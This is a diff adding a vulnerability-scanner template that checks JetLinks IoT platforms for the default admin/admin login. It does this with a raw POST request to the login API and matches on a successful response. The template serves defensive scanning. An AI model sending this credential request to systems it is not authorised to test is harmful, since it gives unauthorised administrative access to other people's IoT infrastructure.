@@ -1,0 +1,30 @@
+id: jetlinks-default-password
+info:
+  name: JetLinks login API Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    JetLinks open source Internet of Things platform is based on Java 8 and Spring Boot 2.x, WebFlux, Netty, Vert.x, and Reactor. It is an enterprise-level IoT basic platform that can be used out of the box and for secondary development. The default credentials are username: admin, password: admin.
+  tags:
+    - default-password
+    - jetlinks
+  reference:
+    - https://www.jetlinks.cn/
+
+http:
+  - raw:
+      - |
+        POST /jetlinks/authorize/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"username":"admin","password":"admin","expires":3600000,"tokenType":"default","verifyKey":"","verifyCode":""}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"expires\":3600000,"
